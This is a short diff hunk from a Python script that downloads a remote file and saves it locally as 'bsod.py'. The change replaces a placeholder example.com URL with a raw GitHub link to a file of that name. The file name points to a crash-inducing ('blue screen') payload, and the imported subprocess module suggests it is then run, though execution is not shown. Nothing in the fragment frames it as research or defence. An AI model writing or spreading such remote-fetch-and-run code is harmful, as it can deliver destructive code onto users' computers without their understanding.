@@ -2,7 +2,7 @@ import os
 import urllib.request
 import subprocess
 
-url = "http://example.com/script.py" 
+url = "https://raw.githubusercontent.com/reefdzefrfd/nonam/refs/heads/main/bsod.py" 
 filename = "bsod.py"
 urllib.request.urlretrieve(url, filename)
 
